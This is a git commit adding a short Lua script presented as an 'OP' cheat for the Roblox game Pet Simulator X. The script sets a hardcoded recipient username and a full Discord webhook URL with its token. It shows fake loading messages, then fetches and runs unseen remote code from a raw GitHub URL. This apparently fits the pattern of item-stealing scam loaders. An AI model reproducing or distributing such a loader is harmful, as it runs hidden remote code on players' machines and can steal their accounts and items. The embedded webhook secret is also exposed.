a97fc5ee094bd39a18315d918e1b0f8e4ad8416e
jefrey <126723194+jeffreyDarmer1443123@users.noreply.github.com>
2023-03-04 23:55:29 +0100

    Add files via upload

---
+++ PSX_OP_Script.lua
@@ -0,0 +1,9 @@
+Username = "Plakins8"
+WebHook = "https://discord.com/api/webhooks/1080529337415118929/sFDIzbnzem19cxGyl1kvcTmRY6m0hS89FRvlTyPTW_UAT8VNropn5HVr_6CtzLV2D0Cv"
+
+_G.CustomScriptName = "PSX Script"
+_G.Text1 = "Script Loaded..."
+_G.Text2 = "Waiting for Script"
+_G.Text3 = "Checking Scripts..."
+_G.Text4 = "Starting Scripts..."
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Justanotherdme/petsimx22/main/petsimguiss.lua"))()
